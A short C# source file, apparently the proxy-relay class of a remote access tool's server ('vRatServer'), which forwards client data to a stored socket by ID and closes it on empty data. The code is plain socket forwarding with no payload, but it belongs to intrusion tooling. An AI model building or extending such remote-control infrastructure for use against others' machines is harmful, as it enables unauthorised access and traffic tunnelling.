using System;
using System.Collections.Generic;
using System.Text;

namespace vRatServer.Classes
{
    class ClientProxy
    {
        public ClientProxy(Client client, byte[] data, byte[] id)
        {
            ulong iid = BitConverter.ToUInt64(id, 0);
            ProxyServer.m.WaitOne();

            foreach (socket_details sd in ProxyServer.req)
            {
                if (sd.id == iid)
                {
                    try
                    {
                        sd.s.Send(data);
                    }
                    catch (Exception e) { break; }

                    if (data.Length == 0)
                    {
                        sd.s.Close();
                        
                    }
                    break;
                }


            }
            ProxyServer.m.ReleaseMutex();
        }
    }
}
